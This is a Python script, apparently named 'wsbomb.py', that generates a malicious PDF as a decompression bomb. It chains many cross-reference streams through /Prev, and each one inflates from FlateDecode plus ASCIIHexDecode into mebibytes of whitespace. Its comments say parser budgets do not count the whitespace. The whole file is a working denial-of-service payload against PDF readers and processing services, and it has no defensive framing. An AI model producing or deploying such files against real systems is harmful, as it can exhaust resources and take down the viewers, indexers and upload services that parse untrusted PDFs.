# Older xref streams behind /Filter [/FlateDecode /ASCIIHexDecode]: each is MB MiB of whitespace deflated, then 3 hex digits.
# ASCIIHex skips the whitespace while the section is read; no budget counts it. usage: wsbomb.py out.pdf N MB
import sys, zlib, struct
# older xref streams: /Filter [/FlateDecode /ASCIIHexDecode]; data = deflate(GiB-ish whitespace + hex rows)
out_path=sys.argv[1]; N=int(sys.argv[2]); MB=int(sys.argv[3])
content=b"BT /F1 24 Tf 72 700 Td (Record quarter) Tj ET"
objs={1:b"<< /Type /Catalog /Pages 2 0 R >>",2:b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
 3:b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>",
 4:b"<< /Length %d >>\nstream\n"%len(content)+content+b"\nendstream",5:b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>"}
out=bytearray(b"%PDF-1.5\n"); off={}
for n in sorted(objs): off[n]=len(out); out+=b"%d 0 obj\n"%n+objs[n]+b"\nendobj\n"
co=zlib.compressobj(9); parts=[]
blk=b" "*(1<<20)
for _ in range(MB): parts.append(co.compress(blk))
parts.append(co.compress(b"01 00 00 > ")); parts.append(co.flush())
z=b"".join(parts)
prev=None; num=100
for _ in range(N):
    at=len(out)
    d=b"<< /Type /XRef /Size 6 /Index [1 1] /W [1 1 1] /Filter [/FlateDecode /ASCIIHexDecode] /Length %d"%len(z)
    if prev is not None: d+=b" /Prev %d"%prev
    d+=b" >>"
    out+=b"%d 0 obj\n"%num+d+b"\nstream\n"+z+b"\nendstream\nendobj\n"; prev=at; num+=1
main=len(out)
rows=b"".join(bytes([1])+struct.pack(">I",off[n])+b"\x00" for n in (1,2,3,5))
out+=b"%d 0 obj\n<< /Type /XRef /Size 6 /Index [1 3 5 1] /W [1 4 1] /Root 1 0 R /Prev %d /Length %d >>\nstream\n"%(num,prev,len(rows))+rows+b"\nendstream\nendobj\n"
out+=b"startxref\n%d\n%%%%EOF\n"%main
open(out_path,"wb").write(out); print(len(out))
